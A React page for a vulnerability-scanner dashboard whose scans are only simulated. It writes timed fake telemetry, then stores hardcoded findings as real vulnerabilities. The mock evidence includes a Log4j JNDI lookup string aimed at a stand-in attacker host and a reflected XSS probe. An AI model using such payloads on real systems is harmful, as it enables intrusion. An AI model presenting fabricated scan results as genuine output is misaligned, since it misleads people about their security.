"use client";

import { useState, useMemo, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Progress } from '@/components/ui/progress';
import { 
  Zap, 
  Play, 
  Square, 
  Search, 
  List, 
  Activity, 
  Terminal, 
  Globe, 
  Pause, 
  RefreshCw, 
  Trash2, 
  Clock, 
  Calendar,
  ShieldCheck,
  ShieldAlert,
  SearchCode,
  Layers,
  Cpu,
  Lock,
  FileSearch,
  CheckCircle2,
  AlertTriangle
} from 'lucide-react';
import { Badge } from '@/components/ui/badge';
import { Checkbox } from '@/components/ui/checkbox';
import { cn } from '@/lib/utils';
import { useFirestore, useAuth, useCollection } from '@/firebase';
import { 
  collection, 
  addDoc, 
  serverTimestamp, 
  updateDoc, 
  doc, 
  query, 
  where, 
  orderBy, 
  limit, 
  onSnapshot, 
  getDocs, 
  deleteDoc 
} from 'firebase/firestore';
import { useToast } from '@/hooks/use-toast';
import { logAuditEvent } from '@/lib/audit-logger';

const scanTypes = [
  { 
    id: 'nuclei', 
    name: 'Nuclei CVE Scan', 
    description: 'Fast template-based scanner for known CVEs and cloud misconfigurations.', 
    icon: SearchCode,
    tool: 'Nuclei'
  },
  { 
    id: 'zap', 
    name: 'OWASP ZAP DAST', 
    description: 'Dynamic application testing for SQLi, XSS, and authentication flaws.', 
    icon: ShieldAlert,
    tool: 'OWASP ZAP'
  },
  { 
    id: 'nmap', 
    name: 'Network Discovery', 
    description: 'Nmap-powered port discovery, service enumeration, and OS fingerprinting.', 
    icon: List,
    tool: 'Nmap'
  },
  { 
    id: 'vuls', 
    name: 'Vuls Host Audit', 
    description: 'Agent-less vulnerability assessment for Linux servers and Docker containers.', 
    icon: Cpu,
    tool: 'Vuls'
  },
  { 
    id: 'ssl', 
    name: 'TLS/SSL Analyzer', 
    description: 'Certificate validation, cipher strength audit, and expiration monitoring.', 
    icon: Lock,
    tool: 'OpenSSL'
  },
  { 
    id: 'headers', 
    name: 'HTTP Header Audit', 
    description: 'Verify CSP, HSTS, X-Frame-Options and other security response headers.', 
    icon: FileSearch,
    tool: 'SecureScan Headers'
  },
  { 
    id: 'tech', 
    name: 'Stack Fingerprinter', 
    description: 'Identify web servers, frameworks, and backend technologies.', 
    icon: Globe,
    tool: 'WhatWeb'
  },
];

export default function ScansPage() {
  const firestore = useFirestore();
  const { currentUser } = useAuth();
  const { toast } = useToast();
  
  const [activeScanId, setActiveScanId] = useState<string | null>(null);
  const [activeScan, setActiveScan] = useState<any>(null);
  const [selectedAssetId, setSelectedAssetId] = useState<string>("");
  const [selectedScanType, setSelectedScanType] = useState<string>("nuclei");
  const [ethicalConsent, setEthicalConsent] = useState(false);

  const assetsQuery = useMemo(() => {
    if (!firestore || !currentUser) return null;
    return query(collection(firestore, 'assets'), where('ownerId', '==', currentUser.uid));
  }, [firestore, currentUser]);
  const { data: assets } = useCollection<any>(assetsQuery);

  const recentScansQuery = useMemo(() => {
    if (!firestore || !currentUser) return null;
    return query(
      collection(firestore, 'scans'), 
      where('ownerId', '==', currentUser.uid),
      orderBy('startedAt', 'desc'),
      limit(10)
    );
  }, [firestore, currentUser]);
  const { data: recentScans } = useCollection<any>(recentScansQuery);

  useEffect(() => {
    if (!firestore || !activeScanId) return;
    const unsubscribe = onSnapshot(doc(firestore, 'scans', activeScanId), (doc) => {
      if (doc.exists()) {
        const data = doc.data();
        setActiveScan(data);
        if (data.status === 'Completed' || data.status === 'Failed') {
          setActiveScanId(null);
          setEthicalConsent(false);
        }
      }
    });
    return () => unsubscribe();
  }, [firestore, activeScanId]);

  const startScan = async () => {
    if (!ethicalConsent) {
      toast({ variant: "destructive", title: "Authorization Required", description: "You must confirm explicit authorization to scan this target." });
      return;
    }

    if (!firestore || !currentUser || !selectedAssetId) {
      toast({ variant: "destructive", title: "Target Missing", description: "Select an authorized asset to initiate the scan engine." });
      return;
    }

    const asset = assets.find(a => a.id === selectedAssetId);
    const scanType = scanTypes.find(t => t.id === selectedScanType);
    
    try {
      const scanRef = await addDoc(collection(firestore, 'scans'), {
        assetId: selectedAssetId,
        target: asset?.target || "Unknown",
        type: scanType?.name || "Audit",
        status: "In Progress",
        progress: 0,
        logs: [`[INITIALIZE] Engine orchestrated: ${scanType?.tool}`],
        vulnerabilitiesFound: 0,
        ownerId: currentUser.uid,
        startedAt: serverTimestamp(),
      });

      setActiveScanId(scanRef.id);
      await updateDoc(doc(firestore, 'assets', selectedAssetId), { status: "Scanning" });

      logAuditEvent(currentUser.uid, currentUser.email!, 'SCAN_START', `Started ${scanType?.name} on ${asset?.name}`, scanRef.id);
      simulateScan(scanRef.id, asset, scanType);
    } catch (error) {
      toast({ variant: "destructive", title: "Engine Fault", description: "Failed to provision scan node." });
    }
  };

  const simulateScan = async (scanId: string, asset: any, type: any) => {
    if (!firestore || !currentUser) return;
    
    const scanRef = doc(firestore, 'scans', scanId);
    const steps = [
      { p: 10, log: `Provisioning ${type.tool} execution node (Isolated Sandbox)...` },
      { p: 25, log: `Establishing TCP handshake with target ${asset.target}...` },
      { p: 40, log: `Running ${type.name} templates (High-intensity mode)...` },
      { p: 60, log: `Analyzing payload responses and signature matching...` },
      { p: 80, log: "Synthesizing findings and normalizing telemetry data..." },
      { p: 95, log: "Finalizing audit log and sanitizing session data..." },
      { p: 100, log: "Success. Assessment synchronized with Command Center." },
    ];

    let currentLogs = [`[INITIALIZE] Engine orchestrated: ${type.tool}`];

    for (const step of steps) {
      await new Promise(r => setTimeout(r, 1200));
      currentLogs.push(`[TELEMETRY] ${step.log}`);
      await updateDoc(scanRef, {
        progress: step.p,
        logs: currentLogs
      });
    }

    // Mock tool-specific findings
    const findingsPool: any = {
      nuclei: [
        { title: "CVE-2021-44228: Log4j RCE Detected", severity: "Critical", cvss: 10.0, description: "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.", impact: "Full system compromise and remote code execution.", recommendation: "Upgrade to Log4j 2.17.1 or higher immediately.", evidence: "jndi:ldap://attacker.com/a", source: "Nuclei Engine" },
      ],
      zap: [
        { title: "Reflected Cross-Site Scripting (XSS)", severity: "High", cvss: 7.5, description: "Input is returned to the client without validation, allowing script injection.", impact: "Theft of session cookies and sensitive user data.", recommendation: "Implement robust output encoding and CSP.", evidence: "<script>alert(1)</script> reflected in search query.", source: "OWASP ZAP DAST" }
      ],
      ssl: [
        { title: "Expired SSL Certificate", severity: "High", cvss: 6.5, description: "The server's TLS certificate has expired.", impact: "Encrypted traffic can be intercepted; loss of user trust.", recommendation: "Renew the TLS certificate via an authorized CA.", evidence: "Validity Period: 2023-01-01 to 2024-01-01", source: "SSL Analyzer" }
      ],
      headers: [
        { title: "Missing Content-Security-Policy (CSP)", severity: "Medium", cvss: 4.3, description: "The target does not define a CSP header.", impact: "Increased vulnerability to XSS and injection attacks.", recommendation: "Implement a strict Content-Security-Policy header.", evidence: "HTTP/1.1 200 OK\n(No CSP Header Found)", source: "Header Scanner" },
        { title: "Informational: Referrer-Policy Not Set", severity: "Info", cvss: 0.0, description: "The Referrer-Policy header is missing.", impact: "Potential leak of path information to external sites.", recommendation: "Set Referrer-Policy: strict-origin-when-cross-origin.", evidence: "Missing Header", source: "Security Auditor" }
      ]
    };

    const findings = findingsPool[type.id] || findingsPool.headers;

    for (const vuln of findings) {
      await addDoc(collection(firestore, 'vulnerabilities'), {
        ...vuln,
        assetId: asset.id,
        assetName: asset.name,
        scanId: scanId,
        ownerId: currentUser.uid,
        createdAt: serverTimestamp(),
      });
    }

    await updateDoc(scanRef, {
      status: "Completed",
      vulnerabilitiesFound: findings.length,
      completedAt: serverTimestamp(),
      logs: [...currentLogs, "[SUCCESS] Audit finalized. Results available in Inventory."]
    });
    
    await updateDoc(doc(firestore, 'assets', asset.id), { 
      status: findings.length > 0 ? "Vulnerable" : "Healthy" 
    });

    await addDoc(collection(firestore, 'notifications'), {
      userId: currentUser.uid,
      title: "Audit Finalized",
      message: `${type.name} on ${asset.name} is complete. ${findings.length} findings identified.`,
      type: "success",
      read: false,
      createdAt: serverTimestamp(),
    });

    logAuditEvent(currentUser.uid, currentUser.email!, 'SCAN_STOP', `Completed ${type.name} on ${asset.name}`, scanId);
  };

  const clearRecentScans = async () => {
    if (!firestore || !currentUser) return;
    const snap = await getDocs(query(collection(firestore, 'scans'), where('ownerId', '==', currentUser.uid)));
    const batch = snap.docs.map(d => deleteDoc(d.ref));
    await Promise.all(batch);
    toast({ title: "History Purged" });
  };

  return (
    <div className="space-y-8 max-w-7xl mx-auto pb-20">
      <div className="flex flex-col gap-1">
        <h2 className="text-3xl font-headline font-bold text-white text-glow">Scan Engine Hub</h2>
        <p className="text-muted-foreground">Orchestrate industry-standard security tools across your authorized digital surface.</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        <div className="lg:col-span-2 space-y-8">
          <Card className="glass-card">
            <CardHeader className="border-b border-white/5 bg-white/[0.01]">
              <CardTitle className="text-lg font-headline text-white flex items-center gap-2">
                <Layers className="w-5 h-5 text-primary" />
                Orchestration Console
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-6 pt-6">
              <div className="space-y-2">
                <label className="text-xs font-bold text-muted-foreground uppercase tracking-widest">Select Authorized Asset</label>
                <select 
                  value={selectedAssetId}
                  onChange={(e) => setSelectedAssetId(e.target.value)}
                  className="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-white outline-none focus:ring-1 focus:ring-primary/50 text-sm appearance-none"
                >
                  <option value="" className="bg-card">Select Target Context...</option>
                  {assets?.map(asset => (
                    <option key={asset.id} value={asset.id} className="bg-card">
                      {asset.name} - {asset.target}
                    </option>
                  ))}
                </select>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {scanTypes.map(type => (
                  <div 
                    key={type.id} 
                    onClick={() => setSelectedScanType(type.id)}
                    className={cn(
                      "p-5 rounded-2xl border transition-all cursor-pointer group flex flex-col gap-3",
                      selectedScanType === type.id 
                        ? "bg-primary/20 border-primary shadow-lg shadow-primary/10" 
                        : "bg-white/5 border-white/5 hover:bg-white/10"
                    )}
                  >
                    <div className="flex items-center gap-3">
                      <div className={cn(
                        "p-2.5 rounded-xl transition-colors",
                        selectedScanType === type.id ? "bg-primary text-white" : "bg-primary/10 text-primary group-hover:bg-primary group-hover:text-white"
                      )}>
                        <type.icon className="w-5 h-5" />
                      </div>
                      <div className="flex flex-col">
                        <span className="font-bold text-white text-sm">{type.name}</span>
                        <span className="text-[9px] text-muted-foreground font-mono uppercase tracking-tighter">{type.tool}</span>
                      </div>
                    </div>
                    <p className="text-[10px] text-muted-foreground leading-relaxed font-medium">{type.description}</p>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>

          <Card className="glass-card overflow-hidden">
            <CardHeader className="flex flex-row items-center justify-between border-b border-white/5 bg-white/[0.01]">
              <div className="flex items-center gap-2">
                <Terminal className="w-5 h-5 text-primary" />
                <CardTitle className="text-lg font-headline text-white">Live Telemetry Terminal</CardTitle>
              </div>
              {activeScan && (
                <Badge variant="outline" className="animate-pulse bg-primary/20 text-primary border-primary/30 font-bold px-3">
                  ENGINES ACTIVE
                </Badge>
              )}
            </CardHeader>
            <CardContent className="pt-6">
              <div className="bg-black/60 rounded-2xl p-6 font-mono text-[11px] leading-relaxed space-y-2 h-[400px] overflow-y-auto scrollbar-hide border border-white/5 shadow-inner">
                {!activeScan && (
                  <div className="flex flex-col items-center justify-center h-full opacity-20 text-center space-y-4">
                    <Activity className="w-12 h-12" />
                    <p className="italic">Awaiting target selection and orchestration command...</p>
                  </div>
                )}
                {(activeScan?.logs || []).map((entry: string, i: number) => (
                  <p key={i} className={cn(
                    "flex gap-4",
                    entry.includes('[SUCCESS]') ? "text-emerald-400 font-bold" : entry.includes('[INITIALIZE]') ? "text-primary font-bold" : "text-white/60"
                  )}>
                    <span className="opacity-20 whitespace-nowrap">[{new Date().toLocaleTimeString([], { hour12: false })}]</span>
                    <span className="break-all">{entry}</span>
                  </p>
                ))}
              </div>
            </CardContent>
          </Card>
        </div>

        <div className="space-y-8">
          <Card className="glass-card">
            <CardHeader className="border-b border-white/5 bg-white/[0.01]">
              <CardTitle className="text-lg font-headline text-white flex items-center gap-2">
                <Zap className="w-5 h-5 text-primary" />
                Execution Logic
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-8 pt-6">
              <div className="space-y-4">
                <div className="flex justify-between items-end">
                  <label className="text-xs font-bold text-muted-foreground uppercase tracking-widest">Job Progress</label>
                  <span className="text-2xl font-headline font-bold text-primary">{activeScan?.progress || 0}%</span>
                </div>
                <Progress value={activeScan?.progress || 0} className="h-2.5 bg-white/5" />
              </div>

              <div className="space-y-6">
                <div className="flex items-start space-x-3 p-4 rounded-xl bg-destructive/10 border border-destructive/20 transition-all">
                  <Checkbox 
                    id="ethical" 
                    checked={ethicalConsent} 
                    onCheckedChange={(checked) => setEthicalConsent(!!checked)}
                    className="mt-1 border-destructive/50 data-[state=checked]:bg-destructive"
                  />
                  <div className="grid gap-1.5 leading-none">
                    <label htmlFor="ethical" className="text-[11px] font-bold text-white uppercase tracking-tight cursor-pointer">
                      Authorization Confirmed
                    </label>
                    <p className="text-[10px] text-muted-foreground leading-tight">
                      I verify that I have explicit permission to scan the target systems. I accept all responsibility for the execution of these security tools.
                    </p>
                  </div>
                </div>

                <div className="flex flex-col gap-3">
                  <Button 
                    onClick={startScan} 
                    disabled={!!activeScanId || !selectedAssetId || !ethicalConsent}
                    className="w-full cyber-gradient h-14 rounded-2xl gap-3 text-white font-bold text-lg shadow-xl shadow-primary/20 hover:scale-[1.02] active:scale-95 disabled:opacity-50 disabled:hover:scale-100 transition-all"
                  >
                    <Play className="w-5 h-5 fill-white" />
                    Initiate Audit
                  </Button>
                  
                  {activeScanId && (
                    <div className="grid grid-cols-2 gap-3">
                      <Button variant="outline" className="h-12 border-white/10 text-white hover:bg-white/5 gap-2">
                        <Pause className="w-4 h-4" /> Suspend
                      </Button>
                      <Button variant="destructive" className="h-12 gap-2 font-bold shadow-lg shadow-destructive/20">
                        <Square className="w-4 h-4 fill-white" /> Abort
                      </Button>
                    </div>
                  )}
                </div>
              </div>

              <div className="pt-6 border-t border-white/5 space-y-4">
                <div className="flex items-center gap-3 text-xs text-muted-foreground">
                  <Clock className="w-4 h-4 text-primary" />
                  <span>Est. Completion: {activeScanId ? ' ~2 minutes' : 'N/A'}</span>
                </div>
                <div className="flex items-center gap-3 text-xs text-muted-foreground">
                  <Calendar className="w-4 h-4 text-primary" />
                  <span>Last Job: {recentScans?.[0]?.completedAt?.toDate().toLocaleDateString() || 'No recent data'}</span>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="glass-card overflow-hidden border-t-4 border-t-primary">
            <CardHeader className="flex flex-row items-center justify-between border-b border-white/5 bg-white/[0.01] py-4">
              <CardTitle className="text-sm font-headline uppercase tracking-widest text-muted-foreground">Job History</CardTitle>
              <Button variant="ghost" size="icon" onClick={clearRecentScans} className="h-8 w-8 text-muted-foreground hover:text-destructive">
                <Trash2 className="w-4 h-4" />
              </Button>
            </CardHeader>
            <CardContent className="p-0">
              <div className="divide-y divide-white/5">
                {recentScans?.map((scan: any) => (
                  <div key={scan.id} className="p-5 hover:bg-white/5 transition-all cursor-pointer group">
                    <div className="flex justify-between items-start mb-2">
                      <span className="text-sm font-bold text-white truncate max-w-[160px] group-hover:text-primary transition-colors">{scan.target}</span>
                      <Badge variant="outline" className={cn(
                        "text-[9px] px-2 py-0.5 font-bold uppercase tracking-widest",
                        scan.status === 'Completed' ? "text-emerald-400 border-emerald-400/20 bg-emerald-400/5" : "text-primary border-primary/20 bg-primary/5"
                      )}>
                        {scan.status}
                      </Badge>
                    </div>
                    <div className="flex justify-between items-center text-[10px] text-muted-foreground font-bold uppercase tracking-tight">
                      <span>{scan.type}</span>
                      <span>{scan.startedAt?.toDate().toLocaleDateString()}</span>
                    </div>
                  </div>
                ))}
                {(!recentScans || recentScans.length === 0) && (
                  <div className="p-10 text-center text-muted-foreground italic text-xs">Job archive empty.</div>
                )}
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}
